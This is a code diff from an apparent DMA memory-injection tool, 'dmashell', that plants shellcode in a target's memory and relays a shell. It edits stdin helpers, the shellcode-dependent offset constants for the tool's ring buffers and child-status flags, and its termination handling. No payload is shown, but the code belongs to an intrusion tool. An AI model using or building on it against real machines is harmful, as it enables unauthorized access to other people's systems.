@@ -209,22 +209,22 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 volatile int do_terminate = 0;
 
 void set_blocking_stdin()
-{
+{{{
 	int flags;
 	// set STDIN to blocking.
 	flags = fcntl(STDIN_FILENO, F_GETFL);
 	flags -= O_NONBLOCK;
 	fcntl(STDIN_FILENO, F_SETFL, flags);
-}
+}}}
 
 void set_nonblocking_stdin()
-{
+{{{
 	int flags;
 	// set STDIN to non-blocking.
 	flags = fcntl(STDIN_FILENO, F_GETFL);
 	flags |= O_NONBLOCK;
 	fcntl(STDIN_FILENO, F_SETFL, flags);
-}
+}}}
 
 void handle_sigint(int __attribute__ ((__unused__)) signal)
 {{{
@@ -266,17 +266,17 @@ void handle_sigint(int __attribute__ ((__unused__)) signal)
 void use_shell(linear_handle lin, uint32_t base)
 {{{
 	// these depend on the used shellcode:
-#define CHILD_IS_DEAD	0x22f
-#define CHILD_IS_DEAD_ACK 0x230
-#define TERMINATE_CHILD	0x231
+#define CHILD_IS_DEAD		0x227
+#define CHILD_IS_DEAD_ACK	0x228
+#define TERMINATE_CHILD		0x229
 
-#define RFRM_WRITER_POS	0x234
-#define RFRM_READER_POS	0x235
-#define RFRM_BUFFER	(0x240 + 20)
+#define RFRM_WRITER_POS		0x22c
+#define RFRM_READER_POS		0x22d
+#define RFRM_BUFFER		(0x238 + 20)
 
-#define RTO_WRITER_POS	0x236
-#define RTO_READER_POS	0x237
-#define RTO_BUFFER	(0x240 + 276)
+#define RTO_WRITER_POS		0x22e
+#define RTO_READER_POS		0x22f
+#define RTO_BUFFER		(0x238 + 276)
 
 	uint8_t true_value = 0x1;
 
@@ -339,8 +339,9 @@ void use_shell(linear_handle lin, uint32_t base)
 		}
 
 		if(do_terminate) {
+			do_terminate = 0;
 			DO_terminate_child;
-			printf(TERM_YELLOW "(dmashell)" TERM_RESET " signal relayed.\n");
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " SIGKILL relayed.\n");
 		}
 
 		if(!rfrm_active && !rto_active)
